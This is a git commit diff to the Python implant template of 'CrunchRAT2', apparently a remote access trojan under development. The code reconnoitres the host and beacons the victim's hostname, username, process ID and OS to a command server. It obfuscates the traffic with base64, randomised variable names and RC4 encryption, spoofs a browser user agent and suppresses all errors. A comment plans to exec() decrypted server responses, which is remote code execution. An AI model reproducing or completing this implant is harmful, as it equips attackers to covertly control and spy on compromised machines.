8d4dec5a77ab586aacff499ef128e9e1c6fc1068
Hunter Hardman <t3ntman@gmail.com>
2017-04-02 02:49:06 -0600

    Added in initial_beacon() function and rc4_beacon() functions

--- Website/templates/implant.py
+++ Website/templates/implant.py
@@ -1,13 +1,18 @@
 import base64, urllib, urllib2, getpass, os, platform, random, socket, string, sys, time
 
+import json
 
-handshake_url = "http://127.0.0.1/CrunchRAT2/Website/handshake.php" # TO DO: Remove hard-coded value
-beacon_url = "http://127.0.0.1/CrunchRAT2/Website/beacon.php" # TO DO: Remove hard-coded value
-user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36" # TO DO: Remove hard-coded value
-sleep_interval = 10 # TO DO: Add in sleep interval jitter
+# TO DO: Remove hard-coded value
+beacon_url = "http://127.0.0.1/CrunchRAT2/Website/beacon.php"
+
+# TO DO: Remove hard-coded value
+user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
+
+# TO DO: Add in sleep interval jitter
+sleep_interval = 10
 
 
-def crypt(data, key):
+def crypt(key, data):
     S = range(256); j = 0; out = []
 
     for i in range(256):
@@ -25,40 +30,57 @@ def crypt(data, key):
     return "".join(out)
 
 
-# TO DO: Wrap handshake beacon in a nice try catch statement
-def handshake_beacon():
-    hostname_var = "".join(random.choice(string.lowercase) for i in range(10))
-    current_user_var = "".join(random.choice(string.lowercase) for i in range(10))
-    process_id_var = "".join(random.choice(string.lowercase) for i in range(10))
-    operating_system_var = "".join(random.choice(string.lowercase) for i in range(10))
+def initial_beacon():
+    try:
+        hostname_var = "".join(random.choice(string.lowercase) for i in range(10))
+        current_user_var = "".join(random.choice(string.lowercase) for i in range(10))
+        process_id_var = "".join(random.choice(string.lowercase) for i in range(10))
+        operating_system_var = "".join(random.choice(string.lowercase) for i in range(10))
 
-    if "Darwin" in platform.system():
-        globals()[operating_system_var] = "Mac OS X " + platform.mac_ver()[0]
-    else:
-        globals()[operating_system_var] = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]
+        if "Darwin" in platform.system():
+            globals()[operating_system_var] = "Mac OS X " + platform.mac_ver()[0]
+        else:
+            globals()[operating_system_var] = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]
 
-    globals()[hostname_var] = socket.gethostname()
-    globals()[current_user_var] = getpass.getuser()
-    globals()[process_id_var] = os.getpid()
+        globals()[hostname_var] = socket.gethostname()
+        globals()[current_user_var] = getpass.getuser()
+        globals()[process_id_var] = os.getpid()
 
-    post_data = [(hostname_var, globals()[hostname_var]),
-        (current_user_var, globals()[current_user_var]),
-        (process_id_var, globals()[process_id_var]),
-        (operating_system_var, globals()[operating_system_var])]
+        post_data = [(hostname_var, globals()[hostname_var]),
+            (current_user_var, globals()[current_user_var]),
+            (process_id_var, globals()[process_id_var]),
+            (operating_system_var, globals()[operating_system_var])]
 
-    base64_encoded = base64.b64encode(urllib.urlencode(post_data))
-    request = urllib2.Request(handshake_url, base64_encoded)
-    request.add_header("User-Agent", user_agent)
-    f = urllib2.urlopen(request)
-    response = f.read()
-    return response
+        base64_encoded = base64.b64encode(urllib.urlencode(post_data))
+        request = urllib2.Request(beacon_url, base64_encoded)
+        request.add_header("User-Agent", user_agent)
+        f = urllib2.urlopen(request)
+        response = f.read()
+        return response
+    except:
+        pass
 
 
-# TO DO: Wrap RC4 beacon in a nice try catch statement
-def rc4_beacon():
-    print "rc4 beacon here"
+def rc4_beacon(key):
+    try:
+        if "Darwin" in platform.system():
+            operating_system = "Mac OS X " + platform.mac_ver()[0]
+        else:
+            operating_system = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]
 
-    # TO DO: Add in RC4 beacon code here
+        hostname = socket.gethostname()
+        current_user = getpass.getuser()
+        process_id = os.getpid()
+
+        params = {"hostname": hostname, "current_user": current_user, "process_id": process_id, "operating_system": operating_system, "nonce": "1"}
+        request = urllib2.Request(beacon_url, data = crypt(key, json.dumps(params)))
+        request.add_header("User-Agent", user_agent)
+        request.add_header("Content-Type", "application/json")
+        f = urllib2.urlopen(request)
+        response = f.read()
+        return response
+    except:
+        pass
 
 
 if __name__ == "__main__":
@@ -66,14 +88,9 @@ if __name__ == "__main__":
 
     while True:
         if counter == 0:
-            k = handshake_beacon()
-
+            k = initial_beacon()
         else:
-            encrypted = crypt("Hunter is super kewl.", k) # DEBUGGING
-            decrypted = crypt(encrypted, k) # DEBUGGING
-            print "Encrypted: " + encrypted # DEBUGGING
-            print "Decrypted: " + decrypted # DEBUGGING
-            rc4_beacon()
+            rc4_beacon(k) # TO DO: This the output returned from this will get decrypted and ran through a Python exec() function
 
         counter += 1
         time.sleep(sleep_interval)
